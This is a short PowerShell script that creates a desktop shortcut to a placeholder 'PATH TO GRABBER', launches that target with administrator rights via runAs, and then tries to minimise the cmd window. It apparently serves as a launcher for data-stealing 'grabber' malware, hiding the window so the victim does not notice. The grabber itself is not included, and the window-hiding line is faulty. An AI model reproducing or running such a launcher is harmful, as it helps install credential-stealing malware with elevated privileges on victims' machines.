$username = $env:USERNAME
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("$env:USERPROFILE\Desktop\MyShortcut.lnk")
$Shortcut.TargetPath = "PATH TO GRABBER"
$Shortcut.Save()
Start-Sleep -Seconds 1
$link = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:USERPROFILE\Desktop\MyShortcut.lnk")
$target = $link.TargetPath
Start-Process -FilePath $target -Verb runAs
Start-Sleep -Seconds 4
$process = Get-Process -Name cmd
$process.MainWindowHandle
$process.MainWindowHandle.WindowStyle = 'Minimized'

